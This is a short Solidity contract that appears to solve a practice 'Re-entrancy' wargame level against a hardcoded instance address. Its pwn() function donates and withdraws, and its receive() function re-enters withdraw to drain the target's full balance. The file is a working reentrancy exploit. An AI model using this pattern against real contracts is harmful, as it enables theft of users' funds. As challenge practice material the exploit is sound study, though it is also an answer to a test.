// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Instance: 0xa182aC558b3ff980Ea14db972fC5Ecb1B638e09D

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract ReEntrancy {
    IReentrance public reentrance = IReentrance(0xa182aC558b3ff980Ea14db972fC5Ecb1B638e09D);

    constructor() {}

    function pwn() external payable {
        uint256 donationAmount = 0.001 ether;

        if (msg.value < donationAmount) {
            revert("Not enough ETH sent");
        }

        // This is to pass the check in withdraw
        reentrance.donate{value: donationAmount}(address(this));

        reentrance.withdraw(donationAmount);
    }

    receive() external payable {
        reentrance.withdraw(address(reentrance).balance);
    }
}
